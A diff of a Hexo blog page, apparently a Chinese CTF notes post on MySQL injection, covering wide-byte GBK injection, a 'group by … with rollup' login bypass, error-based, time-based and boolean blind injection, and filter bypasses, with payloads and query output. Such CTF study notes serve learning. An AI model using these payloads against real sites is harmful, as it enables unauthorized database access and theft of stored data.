@@ -10,7 +10,7 @@
 
     <!--Description-->
     
-        <meta name="description" content="大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧">
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在！">
     
 
     <!--Author-->
@@ -25,9 +25,11 @@
 
     <!--Open Graph Description-->
     
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在！">
+    
 
     <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="Hexo">
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
 
     <!--Type page-->
     
@@ -42,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>SQL - Hexo</title>
+    <title>SQL - Luc1fer&#39;blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -90,12 +92,6 @@
             <li class="menu-item">
                 <a href="/archives">
                     Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
                 </a>
             </li>
             
@@ -149,8 +145,6 @@
                 <span class="date">2019-07-28</span>
             
             
-                <a href="#disqus_thread" class="comments">Comments</a>
-            
             
                 <span class="category">
                     <a href="/categories/ctf/">ctf</a>
@@ -172,18 +166,18 @@
 <p><strong>转义字符</strong>：为了过滤用户输入数据，对一些特殊字符加上反斜杠”<br>“进行转义，mysql中转义函数有</p>
 <pre><code>addslashes,mysql_real_escape_string,mysql_escape_string等，还有一种是配置magic_quote_gpc,不过高版本已经移除该功能</code></pre><p><strong>宽字节注入</strong>是指mysql数据库在使用GBK编码时会认为两个字符是一个汉子(前一个字符的ascii码要大于128才到汉字范围)，而且当我们引入单引号时，mysql会调用转义函数，将单引号变为&#39;,其中的 \ 十六进制为%5C,mysql的GBK编码会认为 %df%5C 是一个宽字节，从而使单引号闭合(逃逸)，从而注入攻击。</p>
 <p><strong>sql数据的变化过程</strong></p>
-<pre><code>%df%27--&gt;addslashes()--&gt;%df%5C%27--&gt;GBK--&gt;運&#39;
+<pre><code>%df%27--&gt;addslashes()--&gt;%df%5C%27--&gt;GBK--&gt;運&apos;
 
 用户输入--&gt;过滤函数--&gt;代码层$sql--&gt;mysql处理请求--&gt;mysql中的sql</code></pre><p>测试题目是南邮的GBK injection</p>
 <p>测试发现加上单引号没有报错但是有转义操作，在单引号前面插入了反斜杠</p>
-<pre><code>?id=1&#39;        
-your sql:select id,title from news where id = &#39;1\&#39;&#39;</code></pre><p>进行宽字节注入</p>
+<pre><code>?id=1&apos;        
+your sql:select id,title from news where id = &apos;1\&apos;&apos;</code></pre><p>进行宽字节注入</p>
 <pre><code>?id=1%df%27
-your sql:select id,title from news where id = &#39;1運&#39;&#39;</code></pre><p>如上所述，加入%df之后mysql认为%df%5C是一个汉字，这样单引号就逃逸出来，但是这里还会报错，因为我们人为的闭合了一个单引号之后查询语句长这样</p>
-<pre><code>id=&#39;運&#39;&#39;</code></pre><p>我们还要把最后一个单引号注释掉才行</p>
+your sql:select id,title from news where id = &apos;1運&apos;&apos;</code></pre><p>如上所述，加入%df之后mysql认为%df%5C是一个汉字，这样单引号就逃逸出来，但是这里还会报错，因为我们人为的闭合了一个单引号之后查询语句长这样</p>
+<pre><code>id=&apos;運&apos;&apos;</code></pre><p>我们还要把最后一个单引号注释掉才行</p>
 <pre><code>?id=1%df%27%23</code></pre><p>注入成功，该查询字段数，查询字段数要用union探测内容，而union得规则是必须列数相同才能正常展示，所以要探测列数，保证构造的查询结果与元数据查询结果的数据结构相同；’order by 1’代表按第一列升序排列，数字代表的列不存在就会报错</p>
 <pre><code>?id=1%df%27 order by 2 %23
-your sql:select id,title from news where id = &#39;1運&#39; order by 2 #&#39;
+your sql:select id,title from news where id = &apos;1運&apos; order by 2 #&apos;
 here is the information</code></pre><p>再探测字段的显示位，即表中数据第几位的字段可以显示。id的值要用-1或者表中没有用过的id值，否则测试值会被覆盖。</p>
 <p>接下来就是常规的注入</p>
 <pre><code>数据库
@@ -195,11 +189,11 @@ here is the information</code></pre><p>再探测字段的显示位，即表中�
 因为这对单引号的转义，我们使用十六进制来读取
 信息
 ?id=-1%df%27 union select 1,group_concat(flag) from ctf4 %23</code></pre><h2 id="ISCC中碰到的group-by…with-rollup"><a href="#ISCC中碰到的group-by…with-rollup" class="headerlink" title="ISCC中碰到的group by…with rollup"></a>ISCC中碰到的group by…with rollup</h2><p>题目来自ISCC线下赛hint.txt</p>
-<pre><code>$sql=&quot;SELECT pwd FROM user WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;
+<pre><code>$sql=&quot;SELECT pwd FROM user WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;;
 $query = mysqli_query($con,$sql); 
 if (mysqli_num_rows($query) == 1) { 
     $key = mysqli_fetch_array($query);
-    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {
+    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) {
         echo &quot;xxxxxxxxx&quot;;
     }else{
         echo &quot;你这密码不太对啊&quot;;
@@ -224,7 +218,7 @@ else{
 |  7 | lili     | e10adc3949ba59abbe56e                   | lili@pikachu.com  |
 +----+----------+--------------------------------------+-------------------+
 
-mysql&gt; select username from member where sex=&#39;boy&#39; group by username;
+mysql&gt; select username from member where sex=&apos;boy&apos; group by username;
 +----------+
 | username |
 +----------+
@@ -235,7 +229,7 @@ mysql&gt; select username from member where sex=&#39;boy&#39; group by username;
 | vince|
 +----------+
 5 rows in set (0.00 sec)</code></pre><p>group by 对结果进行分类，而with rollup字句将在查询的结果最后一行添上一行数据，来显示分组统计的基础上再进行数据的汇总，但是这里的汇总不是简单的求和，而是要根据对数据处理采用的函数决定的</p>
-<pre><code>mysql&gt; select username from member where sex=&#39;boy&#39; group by username with rollup;
+<pre><code>mysql&gt; select username from member where sex=&apos;boy&apos; group by username with rollup;
 +----------+
 | username |
 +----------+
@@ -255,34 +249,34 @@ mysql&gt; select username from member where sex=&#39;boy&#39; group by username;
 +-----+
 1 row in set (0.00 sec)
 
-mysql&gt; select &#39;aaa&#39;=1;
+mysql&gt; select &apos;aaa&apos;=1;
 +---------+
-| &#39;aaa&#39;=1 |
+| &apos;aaa&apos;=1 |
 +---------+
 |   0 |
 +---------+
 1 row in set, 1 warning (0.00 sec)
 
-mysql&gt; select &#39;id&#39;=0;
+mysql&gt; select &apos;id&apos;=0;
 +--------+
-| &#39;id&#39;=0 |
+| &apos;id&apos;=0 |
 +--------+
 |  1 |
 +--------+
 1 row in set, 1 warning (0.00 sec)
 
-mysql&gt; select &#39;id111&#39;=0;
+mysql&gt; select &apos;id111&apos;=0;
 +-----------+
-| &#39;id111&#39;=0 |
+| &apos;id111&apos;=0 |
 +-----------+
 | 1 |
 +-----------+
 1 row in set, 1 warning (0.00 sec)
 
 
-uname=&#39;1&#39;^1--&gt;uname=0--&gt;相等
+uname=&apos;1&apos;^1--&gt;uname=0--&gt;相等
 #异或操作对任一操作数为NULL则返回NULL，对于非NULL得操作数，如果奇数个操作数非零，则值为1，否则为零。</code></pre><p>最后payload为：</p>
-<pre><code>uname=&#39;1&#39;^1 group by pwd with rollup limit 1 offset 1%23&#39;</code></pre><p>稍微解释一下limit offset</p>
+<pre><code>uname=&apos;1&apos;^1 group by pwd with rollup limit 1 offset 1%23&apos;</code></pre><p>稍微解释一下limit offset</p>
 <pre><code>mysql&gt; select * from member limit 3 offset 1;
 +----+----------+----------------------------------+-----+-------------+--------
 ---+-------------------+
@@ -404,21 +398,21 @@ key            count
 <p>我们构造下面的语句</p>
 <pre><code>select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x;
 
-ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</code></pre><p>成功返回信息</p>
+ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</code></pre><p>成功返回信息</p>
 <p>如果不携带uesr()，报的是11，也就是说是concat()函数部分执行了语句</p>
 <pre><code>select count(*) from information_schema.tables group by concat(1,floor(rand(0)*2));
 
-ERROR 1062 (23000): Duplicate entry &#39;11&#39; for key &#39;group_key&#39;</code></pre><ul>
+ERROR 1062 (23000): Duplicate entry &apos;11&apos; for key &apos;group_key&apos;</code></pre><ul>
 <li>其他函数</li>
 </ul>
 <p>updataxml()</p>
-<pre><code>select * from user where username = &#39;admin&#39; or updatexml(1,concat(0x7e,(database())),0);
+<pre><code>select * from user where username = &apos;admin&apos; or updatexml(1,concat(0x7e,(database())),0);
 
-ERROR 1105 (HY000): XPATH syntax error: &#39;~test1&#39;</code></pre><p>因为第二个参数需要Xpath格式，输入不符合就报错，最大长度为32位,extractvalue()也是如此</p>
+ERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><p>因为第二个参数需要Xpath格式，输入不符合就报错，最大长度为32位,extractvalue()也是如此</p>
 <p>extractvalue()</p>
-<pre><code>select * from user where username = &#39;admin&#39; and extractvalue(1,concat(0x7e,(select database())))
+<pre><code>select * from user where username = &apos;admin&apos; and extractvalue(1,concat(0x7e,(select database())))
 
-ERROR 1105 (HY000): XPATH syntax error: &#39;~test1&#39;</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>主要两种，即 <strong>时间盲注</strong> ， <strong>布尔盲注</strong></p>
+ERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>主要两种，即 <strong>时间盲注</strong> ， <strong>布尔盲注</strong></p>
 <h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>*<em>函数 *</em> </p>
 <p>sleep() 睡眠时间为参数设定的秒数，然后返回0。若sleep()被中断，返回1。<br>假如这里我们有一张表</p>
 <pre><code>mysql&gt; select * from user;
@@ -472,7 +466,7 @@ mysql&gt; select * from user where id = 1 or if(1,1,0);
 |  6 | admin                          | 33333    |
 +----+--------------------------------+----------+
 6 rows in set (0.00 sec)</code></pre><p>在不知道字段值的情况下可以通过此种方法得到内容</p>
-<pre><code>mysql&gt; select * from user where username = &#39;&#39; or if(1,1,0);
+<pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(1,1,0);
 +----+--------------------------------+----------+
 | id | username                       | password |
 +----+--------------------------------+----------+
@@ -487,14 +481,14 @@ mysql&gt; select * from user where id = 1 or if(1,1,0);
 <p>substr(str,postion,lines) 从str的第postion个字符开始截取lines长度的字符。</p>
 <p>substring(str,FROM pos FOR len),这里可以不使用逗号。这两个函数如果我们不指定长度就会返回从查到的第一个字符开始的剩下所有字符。</p>
 <p>substring_index(str,关键字，关键字出现次数)。返回str满足出现次数的之前的字符(如果第三个参数是负数则倒着来)</p>
-<pre><code>mysql&gt; select * from user where username = &#39;&#39; or if(substr((select username from user where id=1),1,1)=&#39;a&#39;,sleep(2),0);
+<pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(substr((select username from user where id=1),1,1)=&apos;a&apos;,sleep(2),0);
 Empty set (12.00 sec)</code></pre><p>如果id=1的这条数据第一个字符为’a’，则sleep2s.</p>
 <pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,sleep(2),null);
 Empty set (2.00 sec)</code></pre><p>逐字符查询数据库名。</p>
 <p><strong>配合 case when…then…else…end 触发</strong> </p>
-<pre><code> select case when username = &#39;admin&#39; then &#39;admin&#39; else &#39;xxx&#39; end from user;
+<pre><code> select case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end from user;
 +----------------------------------------------------------+
-| case when username = &#39;admin&#39; then &#39;admin&#39; else &#39;xxx&#39; end |
+| case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end |
 +----------------------------------------------------------+
 | admin                                                    |
 | xxx                                                      |
@@ -508,7 +502,7 @@ Empty set (2.00 sec)</code></pre><p>逐字符查询数据库名。</p>
 <p>BENCHMARK()函数重复count次执行expr。它可以被用于计算MYSQL处理表达式的速度。结果值通常为0。</p>
 <pre><code>select benchmark(10000000,sha(1));</code></pre><p>我们结合上面的语句</p>
 <pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,benchmark(10000000,sha(1)),null);</code></pre><p>*<em>笛卡尔积 *</em></p>
-<pre><code> select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C;</code></pre><p>通过计算来延时</p>
+<pre><code>select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C;</code></pre><p>通过计算来延时</p>
 <pre><code>mysql&gt; select count(*) from user;
 +----------+
 | count(*) |
@@ -545,9 +539,9 @@ select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,(select
 <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>函数</strong> </p>
 <p>截取函数</p>
 <pre><code>mid(column_name,start[,length])
-mysql&gt; select mid(&#39;abc&#39;,1,1);
+mysql&gt; select mid(&apos;abc&apos;,1,1);
 +----------------+
-| mid(&#39;abc&#39;,1,1) |
+| mid(&apos;abc&apos;,1,1) |
 +----------------+
 | a              |
 +----------------+
@@ -556,9 +550,9 @@ mysql&gt; select mid(&#39;abc&#39;,1,1);
 
 left(str,lengt) 从左开始截取字符串
 right(str,length) 从右截取 
-mysql&gt; select right(&#39;abcda&#39;,3);
+mysql&gt; select right(&apos;abcda&apos;,3);
 +------------------+
-| right(&#39;abcda&#39;,3) |
+| right(&apos;abcda&apos;,3) |
 +------------------+
 | cda              |
 +------------------+
@@ -577,9 +571,9 @@ ascii(str)/ord(str)  返回字符串首字母的ascii值</code></pre><p>布尔�
 |  1 | Dumb         | Dumb      |
 |  1 | I-kill-you | 3         |
 +----+------------+----------+</code></pre><p>函数替换：</p>
-<pre><code>mid(&#39;aaa&#39;,1,1) &lt;==&gt; left(&#39;aaa&#39;,1) &lt;==&gt; substr(&#39;aaa&#39;,1,1) &lt;==&gt; substring(&#39;aaa&#39;,1,1)
+<pre><code>mid(&apos;aaa&apos;,1,1) &lt;==&gt; left(&apos;aaa&apos;,1) &lt;==&gt; substr(&apos;aaa&apos;,1,1) &lt;==&gt; substring(&apos;aaa&apos;,1,1)
 
-concat(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;) &lt;==&gt; group\_concat(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;) &lt;==&gt;  concat\_ws(&#39;b&#39;,&#39;a&#39;,&#39;c&#39;)</code></pre><p>逗号绕过：</p>
+concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt; group\_concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt;  concat\_ws(&apos;b&apos;,&apos;a&apos;,&apos;c&apos;)</code></pre><p>逗号绕过：</p>
 <p>union select 联合查询的逗号被过滤时我们可以使用<code>join</code>进行注入</p>
 <pre><code>select * from emails where id = 1.1 union select * from (select 1)a join (select 2)b;</code></pre><p>字符串截取函数中的逗号绕过</p>
 <p>m<code>id(&#39;abc&#39; from 1 for 1) &lt;==&gt; substr(&#39;abc&#39; from 1 for 1) &lt;==&gt; substring(&#39;abc&#39; from 1 for 1)</code></p>
@@ -598,15 +592,15 @@ ERROR 1305 (42000): FUNCTION security.haa does not exist</code></pre><p>爆列�
 </blockquote>
 <p>如果我们传入存在字段的话就会爆出库，表，列。</p>
 <pre><code>mysql&gt; select * from users where id=1 and polygon(id);
-ERROR 1367 (22007): Illegal non geometric &#39;`security`.`users`.`id`&#39; value found during parsing
+ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsing
 mysql&gt; select * from users where id=1 and linestring(id);
-ERROR 1367 (22007): Illegal non geometric &#39;`security`.`users`.`id`&#39; value found during parsing</code></pre><p>爆字段名我们通过命名别名的方式。使用别名的时候表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错，从而爆出字段名，再使用<code>using</code>函数以此爆出其他字段名。</p>
+ERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsing</code></pre><p>爆字段名我们通过命名别名的方式。使用别名的时候表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错，从而爆出字段名，再使用<code>using</code>函数以此爆出其他字段名。</p>
 <pre><code>mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b)as c);
-ERROR 1060 (42S21): Duplicate column name &#39;id&#39;
+ERROR 1060 (42S21): Duplicate column name &apos;id&apos;
 mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id))as c);
-ERROR 1060 (42S21): Duplicate column name &#39;username&#39;
+ERROR 1060 (42S21): Duplicate column name &apos;username&apos;
 mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username))as c);
-ERROR 1060 (42S21): Duplicate column name &#39;password&#39;
+ERROR 1060 (42S21): Duplicate column name &apos;password&apos;
 mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username,password))as c);
 ERROR 1241 (21000): Operand should contain 1 column(s)</code></pre><p>如果过滤了字段名，比如 password 我们可以通过以下方法得到数据</p>
 <pre><code>mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e;
@@ -695,16 +689,6 @@ mysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;
 
     <!-- Comments -->
     
-    <div class="comments">
-        
-<div id="disqus_thread">
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-</div>
-
-
-
-    </div>
-    
 
 </div>
         </section>
@@ -724,7 +708,7 @@ mysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;
             <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                 <h2>About</h2>
                 <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                 </p>
             </div>
             
@@ -745,7 +729,7 @@ mysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;
             </li>
             
             <li>
-                <a class="footer-post" href="/2019/08/19/Black_magic/">black_magic</a>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
             </li>
             
         </ul>
@@ -763,11 +747,11 @@ mysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/wp/">wp</a>
+            <a class="footer-post" href="/categories/docker/">docker</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/docker/">docker</a>
+            <a class="footer-post" href="/categories/wp/">wp</a>
         </li>
         
         <li>
@@ -843,18 +827,6 @@ mysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;
 <script src="/js/main.js"></script>
 
 <!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
 
 
 
